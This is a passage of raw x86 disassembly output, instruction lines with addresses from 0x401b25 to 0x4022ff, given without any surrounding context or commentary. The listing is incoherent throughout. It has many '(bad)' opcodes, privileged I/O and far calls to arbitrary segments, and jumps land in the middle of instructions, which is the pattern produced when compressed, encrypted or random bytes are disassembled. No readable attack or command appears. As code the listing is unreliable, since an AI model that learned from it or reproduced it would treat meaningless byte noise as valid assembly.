  401b25:	test   BYTE PTR [ebx+ebx*4+0x3c],0x7c
  401b2a:	leave  
  401b2b:	outs   dx,DWORD PTR ds:[esi]
  401b2c:	sub    al,0x80
  401b2e:	aaa    
  401b2f:	mov    al,ds:0x941de3a
  401b34:	xchg   BYTE PTR ds:0xe3543ccd,ch
  401b3a:	clc    
  401b3b:	and    al,0x94
  401b3d:	pop    eax
  401b3e:	shl    DWORD PTR [esp+edi*4],1
  401b41:	push   edx
  401b42:	dec    BYTE PTR [edi-0x46]
  401b45:	xchg   ebp,eax
  401b46:	sub    ebp,DWORD PTR [ebx+0x16]
  401b49:	xor    al,0x12
  401b4b:	push   ebx
  401b4d:	stos   DWORD PTR es:[edi],eax
  401b4e:	in     eax,0xbe
  401b50:	(bad)  
  401b51:	mov    esi,0xbb85eaab
  401b56:	and    BYTE PTR [edx-0x14],dh
  401b59:	aaa    
  401b5a:	mov    dh,0xaf
  401b5c:	dec    ebp
  401b5d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b5e:	retf   0x738a
  401b61:	mov    al,ds:0x82d4967f
  401b66:	pop    esi
  401b67:	test   DWORD PTR [ebp-0x4b],0xacc5ec25
  401b6e:	sbb    BYTE PTR [ebp-0x6f],bl
  401b71:	call   0x6433:0xc72ef228
  401b78:	inc    ebp
  401b79:	test   BYTE PTR [edx+0x528688d],cl
  401b7f:	mov    ebx,0x2cdb623
  401b84:	xor    eax,0x1a698c78
  401b89:	dec    esi
  401b8a:	jl     0x401b53
  401b8c:	int3   
  401b8d:	mov    bh,0x12
  401b8f:	add    DWORD PTR [eax-0x7a6fb50d],esp
  401b95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b96:	pop    ebp
  401b97:	xchg   DWORD PTR [edi+0x731fe8dd],eax
  401b9d:	cdq    
  401b9e:	jno    0x401b48
  401ba0:	int    0x72
  401ba2:	jp     0x401c1b
  401ba4:	imul   eax,ebx,0xffffffeb
  401ba7:	rcr    DWORD PTR [edi-0x267c1c88],1
  401bad:	test   BYTE PTR [eax+0xbb6a1b5],0x82
  401bb4:	or     dh,al
  401bb6:	push   0xffffffe3
  401bb8:	pop    eax
  401bb9:	(bad)  
  401bba:	call   0x5cd1:0xf7edfe3f
  401bc1:	or     DWORD PTR [edi-0x672f45bb],0x5d7d0f11
  401bcb:	lds    eax,FWORD PTR [eax]
  401bcd:	pop    eax
  401bce:	mov    ecx,0x89a6e72
  401bd3:	and    ch,al
  401bd5:	inc    esp
  401bd6:	pop    ebx
  401bd7:	fdivr  DWORD PTR [ebp+0x63f6641c]
  401bdd:	mov    al,ds:0x54dbcdf8
  401be2:	in     eax,0xef
  401be4:	out    dx,eax
  401be5:	rcl    BYTE PTR [ebp-0x16],cl
  401be8:	js     0x401bb2
  401bea:	shl    edx,0x61
  401bed:	mov    ch,0x42
  401bef:	in     al,0x40
  401bf1:	xchg   al,cl
  401bf3:	and    DWORD PTR [ebx+0x5d],edi
  401bf6:	pop    ebx
  401bf7:	les    eax,FWORD PTR [ecx-0x495c6817]
  401bfd:	xchg   ebx,eax
  401bfe:	rcr    DWORD PTR [ecx],1
  401c00:	mov    edx,0xad5e053a
  401c05:	adc    ecx,DWORD PTR [ecx]
  401c07:	arpl   di,si
  401c09:	jo     0x401c33
  401c0b:	test   eax,0xaa1e8d86
  401c10:	and    ch,bh
  401c12:	mov    al,0x1d
  401c14:	jnp    0x401b9b
  401c16:	jb     0x401c2f
  401c18:	push   ecx
  401c19:	jae    0x401be9
  401c1b:	mov    ecx,0xcec2f1
  401c20:	lods   eax,DWORD PTR ds:[esi]
  401c21:	fisub  DWORD PTR [ebx+0x5]
  401c24:	cs mov edi,0xb34fe278
  401c2a:	inc    eax
  401c2b:	mov    bh,0xc9
  401c2d:	sti    
  401c2e:	cmp    eax,DWORD PTR [ebp+0x6d83b5f3]
  401c34:	mov    WORD PTR ds:0x4524e81,?
  401c3a:	mov    ds,ebx
  401c3c:	aas    
  401c3d:	sti    
  401c3e:	fmul   DWORD PTR [eax-0x7331074]
  401c44:	push   esp
  401c45:	fsub   QWORD PTR [edi-0x2f]
  401c48:	xchg   BYTE PTR [ebx-0x1d],bl
  401c4b:	(bad)  
  401c4c:	ror    DWORD PTR [ebx],cl
  401c4e:	xchg   BYTE PTR [esi-0x2c],bh
  401c51:	adc    esi,DWORD PTR [ebp-0x5e9a53b6]
  401c57:	dec    eax
  401c58:	fcom   DWORD PTR [eax+0x58c775d7]
  401c5e:	mov    cl,0x19
  401c60:	mov    dl,0xad
  401c62:	imul   ecx,DWORD PTR [edi-0x1e]
  401c66:	jge    0x401c79
  401c68:	push   ebp
  401c69:	enter  0xb916,0x36
  401c6d:	push   0xffffffbe
  401c6f:	mov    edi,0x134bf0a2
  401c74:	in     eax,0x11
  401c76:	call   0xe8c8:0xd86183e9
  401c7d:	jno    0x401cb1
  401c7f:	dec    esi
  401c80:	ficom  WORD PTR [edi]
  401c82:	add    al,0x2d
  401c84:	xor    BYTE PTR [edi-0x3b],0xbb
  401c88:	sbb    DWORD PTR [edx+0x6f],0xffffff83
  401c8c:	pop    eax
  401c8d:	pop    ss
  401c8e:	js     0x401c76
  401c90:	pusha  
  401c91:	pushf  
  401c92:	fcomp  QWORD PTR [edx+0x2c3df065]
  401c98:	aaa    
  401c99:	pop    ebx
  401c9a:	stc    
  401c9b:	cli    
  401c9c:	xor    DWORD PTR ds:0xc18ecf02,eax
  401ca2:	xor    BYTE PTR [ecx-0x6defa1f6],0xa0
  401ca9:	adc    DWORD PTR [ecx],ecx
  401cab:	jae    0x401cb0
  401cad:	adc    al,0x5e
  401caf:	cli    
  401cb0:	adc    DWORD PTR [ebp-0x33e7ab4],ebx
  401cb6:	adc    al,0xdb
  401cb8:	pop    es
  401cb9:	sub    BYTE PTR [edi],dl
  401cbb:	cmp    edi,DWORD PTR [edi]
  401cbd:	repz sub BYTE PTR [esi+0x6e],0xd0
  401cc2:	fdiv   DWORD PTR [ebx+0x58]
  401cc5:	rcr    BYTE PTR [edi],0x3a
  401cc8:	jl     0x401c93
  401cca:	add    al,0xa8
  401ccc:	sub    al,0x75
  401cce:	xchg   ebx,eax
  401ccf:	out    0xca,al
  401cd1:	jecxz  0x401cd0
  401cd3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401cd4:	mov    esp,DWORD PTR [edi+0x24af17c8]
  401cda:	fstp   QWORD PTR [ebx+ebx*1-0x3a]
  401cde:	push   esp
  401cdf:	xor    BYTE PTR [esi],dl
  401ce1:	adc    al,al
  401ce3:	inc    ebp
  401ce4:	not    DWORD PTR [edi+0x75]
  401ce7:	retf   
  401ce8:	add    DWORD PTR [ecx+0xc7b3dc7],0x9c7f856f
  401cf2:	stos   BYTE PTR es:[edi],al
  401cf3:	xchg   edx,eax
  401cf4:	ins    DWORD PTR es:[edi],dx
  401cf5:	jg     0x401d11
  401cf7:	xor    ebp,ecx
  401cf9:	shl    DWORD PTR [edi+0x3c94692c],1
  401cff:	ins    BYTE PTR es:[edi],dx
  401d00:	dec    DWORD PTR [esi-0x3ee056a3]
  401d06:	clc    
  401d07:	fsub   DWORD PTR [esi-0x25]
  401d0a:	test   al,0x26
  401d0c:	popa   
  401d0d:	cmc    
  401d0e:	(bad)  
  401d0f:	outs   dx,BYTE PTR ds:[esi]
  401d10:	dec    esi
  401d11:	mov    edx,0x79d05c75
  401d16:	repz iret 
  401d18:	test   eax,0xbbabb956
  401d1e:	test   al,0xae
  401d20:	and    edi,esp
  401d22:	sub    BYTE PTR [esi+0x29],ch
  401d25:	cmc    
  401d26:	(bad)  
  401d27:	jmp    0x9edf264c
  401d2c:	push   ecx
  401d2d:	jmp    0x401d08
  401d2f:	repz rcl BYTE PTR [ebp+0x18],cl
  401d33:	xlat   BYTE PTR ds:[ebx]
  401d34:	inc    esi
  401d35:	enter  0x625c,0x58
  401d39:	out    0xa7,al
  401d3b:	mov    edx,edx
  401d3d:	or     eax,0xadad4f6e
  401d42:	les    ebp,FWORD PTR [esi*1+0x52326d67]
  401d49:	dec    ecx
  401d4a:	mov    ebp,0xaf3574a8
  401d4f:	aaa    
  401d50:	dec    eax
  401d51:	push   esi
  401d52:	ror    DWORD PTR [ebx-0x6b],0x69
  401d56:	lea    esp,[ebx+esi*1+0x701bf1a5]
  401d5d:	push   eax
  401d5e:	sbb    ch,bh
  401d60:	pop    ebx
  401d61:	cmp    esi,ecx
  401d63:	mov    esi,0x8abcdeda
  401d68:	arpl   dx,ax
  401d6a:	test   BYTE PTR [ebp-0x78],dl
  401d6d:	dec    esp
  401d6e:	mov    ah,0x1
  401d70:	mov    ch,0x1f
  401d72:	dec    esp
  401d73:	push   ds
  401d74:	or     BYTE PTR [ecx],dh
  401d76:	or     edi,eax
  401d78:	das    
  401d79:	mov    dh,ah
  401d7b:	mov    ds:0xec04bb91,eax
  401d80:	ret    
  401d81:	xchg   edi,eax
  401d82:	test   al,0x74
  401d84:	shl    BYTE PTR ds:0xc197c5c4,1
  401d8a:	mov    ecx,0x4bba3a2d
  401d8f:	xor    BYTE PTR [esi+0x72c3ff44],dh
  401d95:	push   ebx
  401d96:	hlt    
  401d97:	xchg   dl,ah
  401d99:	addps  xmm7,XMMWORD PTR [ebx-0x458b27f1]
  401da0:	xor    al,0x50
  401da2:	in     al,dx
  401da3:	or     al,0xb7
  401da5:	aam    0xa2
  401da7:	(bad)  
  401da9:	push   esp
  401daa:	mov    edi,0x838c5418
  401daf:	xor    esi,DWORD PTR [ebx+0x7a]
  401db2:	mov    esi,0x7ecffadc
  401db7:	mov    al,ds:0xaa08d2c5
  401dbc:	std    
  401dbd:	stos   WORD PTR es:[edi],ax
  401dbf:	jmp    0x401e03
  401dc1:	xor    DWORD PTR [ecx],ecx
  401dc3:	ja     0x401e40
  401dc5:	iret   
  401dc6:	mov    bh,0x7b
  401dc8:	aam    0x51
  401dca:	mov    ebx,0x7e73eeff
  401dcf:	arpl   WORD PTR [eax+0x51],sp
  401dd2:	sub    esi,DWORD PTR [esi]
  401dd4:	mov    bh,BYTE PTR [edi+0x4bcbb397]
  401dda:	into   
  401ddb:	dec    eax
  401ddc:	mov    ch,0x2f
  401dde:	fs nop
  401de0:	jbe    0x401d7b
  401de2:	ins    BYTE PTR es:[edi],dx
  401de3:	sbb    eax,0x9a0c0c6
  401de8:	test   al,0x6c
  401dea:	out    0x2f,eax
  401dec:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401ded:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401dee:	xor    esi,DWORD PTR ds:0x6823b233
  401df4:	xlat   BYTE PTR ds:[ebx]
  401df5:	jbe    0x401dd3
  401df7:	ins    BYTE PTR es:[edi],dx
  401df8:	and    al,0x1d
  401dfa:	jo     0x401dc6
  401dfc:	loop   0x401e1c
  401dfe:	jb     0x401e63
  401e00:	arpl   WORD PTR [ebp-0x15],bp
  401e03:	or     al,0xfe
  401e05:	and    BYTE PTR [ecx],bh
  401e07:	jo     0x401e7c
  401e09:	cwde   
  401e0a:	call   0x5384:0x1d423764
  401e11:	xor    ebx,DWORD PTR [esi-0xe]
  401e14:	fsubr  QWORD PTR [edi-0x6d5ae35d]
  401e1a:	cmp    al,0x69
  401e1c:	call   FWORD PTR [eax]
  401e1e:	stos   DWORD PTR es:[edi],eax
  401e1f:	sub    ebp,ebp
  401e21:	add    ch,BYTE PTR [ebx+0x33]
  401e24:	pop    esi
  401e25:	xor    eax,0x8aeda8be
  401e2a:	mov    bh,0x48
  401e2c:	mov    cl,0xd9
  401e2e:	shl    BYTE PTR [esi+0x46fa69eb],cl
  401e34:	ds (bad) 
  401e36:	jbe    0x401dc8
  401e38:	inc    edi
  401e39:	add    DWORD PTR [eax+0x4d],ebp
  401e3c:	mov    al,0xe9
  401e3e:	mov    cl,0x4
  401e40:	dec    esp
  401e41:	and    dl,dl
  401e43:	out    dx,eax
  401e44:	int3   
  401e45:	sub    ebx,DWORD PTR [edi]
  401e47:	jno    0x401e65
  401e49:	or     eax,0xded84453
  401e4e:	dec    edx
  401e4f:	jbe    0x401e87
  401e51:	cld    
  401e52:	sub    bl,BYTE PTR [ecx+0x4d]
  401e55:	sbb    BYTE PTR [eax+0xb8f31c4],dl
  401e5b:	cdq    
  401e5c:	cli    
  401e5d:	lds    esp,FWORD PTR [esi+0x65]
  401e60:	sub    al,0x6f
  401e62:	pop    es
  401e63:	pusha  
  401e64:	fsubr  DWORD PTR ds:0xd5278d46
  401e6a:	shl    DWORD PTR [edx+0x9],1
  401e6d:	cdq    
  401e6e:	adc    BYTE PTR [edx],bl
  401e70:	aad    0xef
  401e72:	push   edi
  401e73:	shl    DWORD PTR [ebx+0x41e1a20c],1
  401e79:	int3   
  401e7a:	cwde   
  401e7b:	nop
  401e7c:	inc    ebp
  401e7d:	cmp    BYTE PTR [ecx+ebp*1],cl
  401e80:	adc    BYTE PTR [esi],0x7d
  401e83:	push   esp
  401e84:	mov    ebp,DWORD PTR [ebx+0x4e]
  401e87:	mov    eax,ds:0x6d6050d3
  401e8c:	popa   
  401e8d:	pop    esp
  401e8e:	icebp  
  401e8f:	ror    esi,cl
  401e91:	jge    0x401e81
  401e93:	mov    edi,0x42c8c71b
  401e98:	ds xchg esi,eax
  401e9a:	sbb    dl,BYTE PTR ds:0x129d9500
  401ea0:	inc    esi
  401ea1:	mov    ds:0x2742b904,eax
  401ea6:	mov    eax,ds:0xc02c736f
  401eab:	lock aad 0x47
  401eae:	sub    al,0x26
  401eb0:	ins    DWORD PTR es:[edi],dx
  401eb1:	retf   0xa774
  401eb4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401eb6:	addr16 push ebx
  401eb8:	xchg   esi,eax
  401eb9:	fld    QWORD PTR [edi-0x49]
  401ebc:	jmp    0x401e72
  401ebe:	addr16 daa 
  401ec0:	test   ch,dh
  401ec2:	out    dx,al
  401ec3:	popa   
  401ec4:	rcr    DWORD PTR [edi-0x3c7cbfe4],cl
  401eca:	retf   
  401ecb:	test   BYTE PTR [ebx-0x7f268955],0x9e
  401ed2:	mov    edx,DWORD PTR ds:0x4101156f
  401ed8:	test   eax,0x6f382d7e
  401edd:	iret   
  401ede:	xor    ebp,DWORD PTR [edi+0x5f37c4c2]
  401ee4:	sub    dh,dh
  401ee6:	xchg   ebx,eax
  401ee7:	sub    ebp,DWORD PTR [edx-0x7575b934]
  401eed:	push   0xffffff9e
  401eef:	(bad)  
  401ef0:	int3   
  401ef1:	in     al,dx
  401ef2:	mov    eax,ds:0x21852cf8
  401ef7:	icebp  
  401ef8:	push   edx
  401ef9:	mov    dh,0x6e
  401efb:	cmc    
  401efc:	les    edi,FWORD PTR [edi]
  401efe:	jno    0x401f0c
  401f00:	sbb    ax,0xc638
  401f04:	pop    esi
  401f05:	inc    eax
  401f06:	out    dx,eax
  401f07:	retf   0x62d3
  401f0a:	dec    eax
  401f0b:	adc    al,0x5f
  401f0d:	add    eax,0x4e8a19e3
  401f12:	jmp    0x401f22
  401f14:	fsubr  QWORD PTR ds:0xf2ee928d
  401f1a:	stos   BYTE PTR es:[edi],al
  401f1b:	test   al,0x9
  401f1d:	and    al,0xdf
  401f1f:	add    ah,BYTE PTR [ecx-0xa]
  401f22:	pop    ebx
  401f23:	inc    edx
  401f24:	scas   al,BYTE PTR es:[edi]
  401f25:	mov    BYTE PTR [eax-0x2b8adf86],ch
  401f2b:	jmp    0x401f22
  401f2d:	pushf  
  401f2e:	sbb    al,bl
  401f30:	dec    edx
  401f31:	jle    0x401eca
  401f33:	clc    
  401f34:	push   esp
  401f35:	dec    eax
  401f36:	aad    0x5d
  401f38:	jns    0x401fb9
  401f3a:	shl    BYTE PTR [edi-0x13],cl
  401f3d:	outs   dx,DWORD PTR ds:[esi]
  401f3e:	pop    ss
  401f3f:	and    eax,0x21b901
  401f44:	jle    0x401ee2
  401f46:	fnstcw WORD PTR [edx+0x69050294]
  401f4c:	cmp    DWORD PTR [eax],edi
  401f4e:	pop    ebp
  401f4f:	sbb    edx,DWORD PTR [edx+ebx*2]
  401f52:	pop    es
  401f53:	daa    
  401f54:	add    eax,0xb2e7c21
  401f59:	adc    ecx,esp
  401f5b:	push   ds
  401f5c:	lea    eax,[esi+0x2a]
  401f5f:	mov    esi,0x921d5e0e
  401f64:	mov    al,ds:0xe86b43b9
  401f69:	lea    esp,[ebp-0x20f19dab]
  401f6f:	mov    bl,0x53
  401f71:	loopne 0x401fa6
  401f73:	inc    edx
  401f74:	dec    ebx
  401f75:	push   esp
  401f76:	fisubr DWORD PTR [ebx+0x6a]
  401f79:	add    dl,bh
  401f7b:	mov    cl,0x9b
  401f7d:	and    al,0x37
  401f7f:	ret    0xae70
  401f82:	sbb    ecx,DWORD PTR [edx]
  401f84:	into   
  401f85:	push   es
  401f86:	pop    ecx
  401f87:	hlt    
  401f88:	adc    ecx,edx
  401f8a:	dec    edx
  401f8b:	cmp    DWORD PTR [eax+0x70],esp
  401f8e:	jne    0x401f1a
  401f90:	mov    edi,0xcc47dcb6
  401f95:	sbb    BYTE PTR [edi],cl
  401f97:	xchg   esp,eax
  401f98:	es add ebp,ebx
  401f9b:	loopne 0x401f6c
  401f9d:	lods   al,BYTE PTR ds:[esi]
  401f9e:	cmp    dl,BYTE PTR [edi+0xc]
  401fa1:	iret   
  401fa2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fa3:	and    al,0xe4
  401fa5:	dec    edx
  401fa6:	retf   0x63b
  401fa9:	fsub   DWORD PTR [edx-0x608b61e3]
  401faf:	bound  edx,QWORD PTR [edi]
  401fb1:	jo     0x401ffd
  401fb3:	addr16 in al,dx
  401fb5:	and    cl,BYTE PTR [ebp+0x34]
  401fb8:	mov    esp,0xd1c7bf44
  401fbd:	mov    edx,0xab37ad86
  401fc2:	popa   
  401fc3:	and    BYTE PTR [esi-0x46],al
  401fc6:	pop    ds
  401fc7:	pop    ebp
  401fc8:	mov    ebx,0xea90e050
  401fcd:	stos   DWORD PTR es:[edi],eax
  401fce:	sub    eax,0x44d98db6
  401fd3:	bnd jbe 0x40203c
  401fd6:	call   0x9850:0xd1fbd347
  401fdd:	and    DWORD PTR [edx-0x1d7c8ee4],esi
  401fe3:	out    dx,al
  401fe4:	js     0x401fe9
  401fe6:	mov    DWORD PTR [esi+esi*4-0x6a678fbd],0x2296053b
  401ff1:	mov    ecx,0x15ee5ece
  401ff6:	in     al,dx
  401ff7:	xlat   BYTE PTR ds:[ebx]
  401ff8:	addr16 cmc 
  401ffa:	(bad)  
  401ffb:	xchg   ecx,eax
  401ffc:	leave  
  401ffd:	and    al,BYTE PTR [eax+0x50]
  402000:	dec    ecx
  402001:	ja     0x401fa7
  402003:	rol    DWORD PTR [edx],0xe
  402006:	inc    esp
  402007:	fisub  DWORD PTR [ebx-0x3f9a901a]
  40200d:	loopne 0x402009
  40200f:	iret   
  402010:	(bad)  
  402011:	jmp    0xf2f571b6
  402016:	ror    DWORD PTR [edi+0x51],1
  402019:	mov    edi,0x4adf0dca
  40201e:	xor    esi,esp
  402020:	call   0x1b79:0x5c3f6eea
  402027:	(bad)  
  402028:	push   esp
  402029:	mov    ah,0x22
  40202b:	jo     0x402049
  40202d:	mov    bl,0xa5
  40202f:	jmp    0x3d1:0x5a27674e
  402036:	xchg   esp,eax
  402037:	outs   dx,BYTE PTR ds:[esi]
  402038:	and    al,0xcd
  40203a:	dec    edi
  40203b:	and    DWORD PTR [edx+0x22],ecx
  40203e:	mov    esp,0xe8f10efd
  402043:	pop    ds
  402044:	fstp   DWORD PTR [edx+edi*1-0x6dd1e560]
  40204b:	inc    esi
  40204c:	cmp    DWORD PTR [eax+0x1a],ebp
  40204f:	xchg   esi,eax
  402050:	jnp    0x402086
  402052:	push   edx
  402053:	rol    BYTE PTR [edi],1
  402055:	add    al,0x6f
  402057:	mov    al,ds:0xcdba1b9a
  40205c:	pusha  
  40205d:	lahf   
  40205e:	cmp    BYTE PTR [esi+0x7d],al
  402061:	std    
  402062:	cmp    al,0xf2
  402064:	and    al,0x25
  402066:	push   edi
  402067:	jmp    0x273e:0xf5839ab2
  40206e:	dec    esp
  40206f:	cdq    
  402070:	inc    eax
  402071:	call   0x98860b5a
  402076:	mov    ah,0x4b
  402078:	pusha  
  402079:	sbb    eax,0xc075b242
  40207e:	shl    DWORD PTR [edx+0x52],0x3
  402082:	xor    dl,dl
  402084:	or     bl,bl
  402086:	test   al,0x75
  402088:	(bad)  
  402089:	stc    
  40208a:	and    eax,0x3ba791b0
  40208f:	inc    ebx
  402090:	mov    eax,0xa445889c
  402095:	mov    ah,BYTE PTR [esi]
  402097:	repnz adc eax,0xcef3d9fe
  40209d:	clc    
  40209e:	push   ss
  40209f:	push   edi
  4020a0:	push   ebx
  4020a1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4020a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4020a3:	int3   
  4020a4:	and    cl,BYTE PTR [edi+0x30]
  4020a7:	push   ecx
  4020a8:	aaa    
  4020a9:	adc    al,0xa
  4020ab:	in     al,dx
  4020ac:	sub    dh,BYTE PTR [ebx-0x7973fe81]
  4020b2:	je     0x4020ae
  4020b4:	(bad)  
  4020b6:	mov    al,0xbd
  4020b8:	sahf   
  4020b9:	pop    eax
  4020ba:	test   al,0x11
  4020bc:	xchg   ebp,eax
  4020bd:	dec    edx
  4020be:	test   eax,0xb151d2e7
  4020c3:	(bad)  
  4020c4:	xlat   BYTE PTR ds:[ebx]
  4020c5:	mul    edi
  4020c7:	leave  
  4020c8:	add    esp,DWORD PTR [edi]
  4020ca:	adc    al,0x41
  4020cc:	jns    0x402112
  4020ce:	fs inc eax
  4020d0:	jecxz  0x402083
  4020d2:	jle    0x40207d
  4020d4:	(bad)  [esi+0x3e]
  4020d7:	mov    BYTE PTR [esi-0x67],cl
  4020da:	enter  0x7d41,0x86
  4020de:	aaa    
  4020df:	sbb    DWORD PTR [ecx],ebx
  4020e1:	jbe    0x4020b3
  4020e3:	fnstsw WORD PTR [eax-0x1e]
  4020e6:	sub    al,0x5
  4020e8:	pop    edx
  4020e9:	fsubrp st(3),st
  4020eb:	add    edi,esi
  4020ed:	cmc    
  4020ee:	push   edi
  4020ef:	into   
  4020f0:	jle    0x402087
  4020f2:	mov    ds:0x6fd906b6,al
  4020f7:	(bad)  [edi-0x64]
  4020fa:	mov    edi,0x470e29e2
  4020ff:	mov    DWORD PTR [ecx],edx
  402101:	sbb    BYTE PTR [eax-0x67],ah
  402104:	fsub   st(5),st
  402106:	push   edx
  402107:	xor    ch,cl
  402109:	mov    ecx,eax
  40210b:	pushf  
  40210c:	repz les ecx,FWORD PTR [edi]
  40210f:	inc    ecx
  402110:	xchg   edi,eax
  402112:	call   0x9cee:0x3086878c
  402119:	inc    ebx
  40211a:	add    eax,0xa09a8b2c
  40211f:	ss jp  0x402144
  402122:	pop    ecx
  402123:	mov    DWORD PTR [edi],eax
  402125:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  402126:	mov    eax,ds:0x7551823a
  40212b:	fmul   st(6),st
  40212d:	inc    esi
  40212e:	inc    edx
  40212f:	jmp    0xca53:0x489a9b14
  402136:	in     eax,0xb9
  402138:	jo     0x4020c8
  40213a:	sti    
  40213b:	xor    dl,BYTE PTR [ecx]
  40213d:	cwde   
  40213e:	jp     0x402167
  402140:	and    BYTE PTR [esi+eiz*2],dl
  402143:	sub    eax,0x6fdf0972
  402148:	aaa    
  402149:	mov    eax,0x15878894
  40214e:	mov    ch,0x12
  402150:	sahf   
  402151:	sbb    dh,ch
  402153:	fsub   DWORD PTR [ecx+eax*1+0x5c2571c5]
  40215a:	adc    DWORD PTR [esi+0x7c],edx
  40215d:	fwait
  40215e:	push   edi
  40215f:	ds xchg edx,eax
  402161:	push   ss
  402162:	push   ebx
  402163:	cdq    
  402164:	xor    DWORD PTR [ebx-0x359352d0],ebp
  40216a:	scas   eax,DWORD PTR es:[edi]
  40216b:	add    ecx,DWORD PTR [edi]
  40216d:	mov    al,ds:0x2c2fff57
  402172:	sahf   
  402173:	or     dh,BYTE PTR [eax+ecx*2-0x61c9ee1a]
  40217a:	lahf   
  40217b:	jne    0x4021b2
  40217d:	int    0x71
  40217f:	sets   BYTE PTR [esp+edx*2-0x2aaa56fa]
  402187:	jg     0x402126
  402189:	mov    dh,0x22
  40218b:	ja     0x40219a
  40218d:	mov    cl,0x65
  40218f:	(bad)  
  402190:	jno    0x4021fc
  402192:	cld    
  402193:	push   ebp
  402194:	shl    BYTE PTR [edx],cl
  402196:	sub    DWORD PTR [edi-0x25],esp
  402199:	sbb    DWORD PTR ds:0x92c9fc36,edx
  40219f:	mov    ecx,0x12673290
  4021a4:	dec    ecx
  4021a5:	fmul   st(2),st
  4021a7:	xor    DWORD PTR [ecx-0x26],0x86d8d1c7
  4021ae:	pop    ds
  4021af:	(bad)  
  4021b0:	in     eax,0x3d
  4021b2:	mov    esi,fs
  4021b4:	shl    BYTE PTR [ebx],0x44
  4021b7:	inc    esp
  4021b8:	fsubr  st(6),st
  4021ba:	xchg   ecx,eax
  4021bb:	test   DWORD PTR [edx+edi*2+0x66],0x6296d59c
  4021c3:	pop    esp
  4021c4:	pusha  
  4021c5:	mov    al,ds:0x859ef53d
  4021ca:	pusha  
  4021cb:	xor    BYTE PTR [edx+eax*2],dh
  4021ce:	jne    0x40215b
  4021d0:	in     al,0x0
  4021d2:	cmp    dh,BYTE PTR [ecx]
  4021d4:	pop    esi
  4021d5:	jmp    0x645dd50a
  4021da:	sub    BYTE PTR [eax-0x34d233d6],al
  4021e0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4021e1:	into   
  4021e2:	pushf  
  4021e3:	pop    ds
  4021e4:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4021e6:	repnz push es
  4021e8:	aam    0x5f
  4021ea:	pmaxub mm2,QWORD PTR [esi]
  4021ed:	mov    cs,WORD PTR [edi-0x74]
  4021f0:	js     0x40219f
  4021f2:	adc    DWORD PTR [ecx],esi
  4021f4:	cmp    DWORD PTR [ecx+ebp*2+0x39e343cd],ebx
  4021fb:	loopne 0x402197
  4021fd:	addr16 push 0xffffffca
  402200:	jp     0x40221c
  402202:	mov    dh,0xf8
  402204:	rcr    DWORD PTR [edx-0x37d84b0],1
  40220a:	div    DWORD PTR [eax-0x6f]
  40220d:	dec    ecx
  40220e:	(bad)  
  402210:	rcr    ecx,1
  402212:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402213:	fdiv   DWORD PTR [eax-0x452c022f]
  402219:	blcic  edx,DWORD PTR [edi+0xbbd0083]
  402222:	mov    bh,0x57
  402224:	pop    es
  402225:	add    al,0x3c
  402227:	ret    0x6dea
  40222a:	ja     0x402225
  40222c:	addr16 (bad) 
  40222e:	(bad)  [ecx+ebp*4]
  402231:	addr16 iret 
  402233:	jbe    0x402269
  402235:	push   ebx
  402236:	jo     0x402269
  402238:	mov    WORD PTR [ecx+0x24],es
  40223b:	mov    eax,0x6b8567c3
  402240:	cmp    eax,0x16e93507
  402245:	or     eax,0xf0f6c99c
  40224a:	repnz in al,0xbb
  40224d:	enter  0x8827,0x29
  402251:	shl    DWORD PTR [ebx+eiz*1+0x18],cl
  402255:	outs   dx,BYTE PTR ds:[esi]
  402256:	mov    ah,0xdb
  402258:	adc    ah,bh
  40225a:	(bad)  
  40225b:	xchg   edx,eax
  40225c:	sub    esi,DWORD PTR [edi]
  40225e:	jg     0x402263
  402260:	mov    ds:0xf7047540,eax
  402265:	ss push ebx
  402267:	jno    0x4021ea
  402269:	push   edi
  40226a:	pop    es
  40226b:	out    dx,eax
  40226c:	cmp    esi,esi
  40226e:	mov    bh,0xfb
  402270:	in     al,dx
  402271:	adc    al,0x9d
  402273:	mov    edi,0x7fd96130
  402278:	push   edi
  402279:	mov    bh,BYTE PTR [edi-0x6a]
  40227c:	sub    cl,BYTE PTR [eax-0x52af7255]
  402282:	mov    ecx,0xdce5ef7e
  402287:	and    eax,0xd726d06c
  40228c:	test   eax,0x8b360270
  402291:	jbe    0x402268
  402293:	xor    ecx,DWORD PTR [ebp-0x19e9471a]
  402299:	cmp    eax,0x157b9dd7
  40229e:	sub    esp,DWORD PTR [ecx]
  4022a0:	cmp    esp,DWORD PTR ss:[edx-0xc064235]
  4022a7:	push   edx
  4022a8:	idiv   DWORD PTR [edi-0x27488939]
  4022ae:	iret   
  4022af:	adc    esp,ecx
  4022b1:	sbb    edi,DWORD PTR [esi+0x7a40c7f8]
  4022b7:	mov    bl,0x6d
  4022b9:	retf   
  4022ba:	jnp    0x402282
  4022bc:	pop    eax
  4022bd:	sbb    al,0x65
  4022bf:	div    BYTE PTR [ebx+0x7d]
  4022c2:	xchg   DWORD PTR [edx+esi*8-0x56],ecx
  4022c6:	inc    ebp
  4022c7:	add    al,0xed
  4022c9:	jb     0x4022a9
  4022cb:	and    DWORD PTR [eax-0x33],edx
  4022ce:	(bad)  
  4022cf:	sar    DWORD PTR [ecx+0x6d],1
  4022d2:	adc    ch,bh
  4022d4:	adc    edx,DWORD PTR [edx-0x274243b2]
  4022da:	lods   al,BYTE PTR ds:[esi]
  4022db:	repnz (bad) [ebp-0x14]
  4022df:	xabort 0x37
  4022e2:	cmp    esp,ebp
  4022e4:	retf   
  4022e5:	jle    0x4022b6
  4022e7:	mov    ebx,0x7c01ed53
  4022ec:	call   0x87e88685
  4022f1:	xchg   ebx,eax
  4022f2:	add    BYTE PTR [eax],0xe7
  4022f5:	fmul   DWORD PTR [ebx-0x1531a3ab]
  4022fb:	adc    ebx,edx
  4022fd:	jp     0x40235f
  4022ff:	mov    dh,0x9e
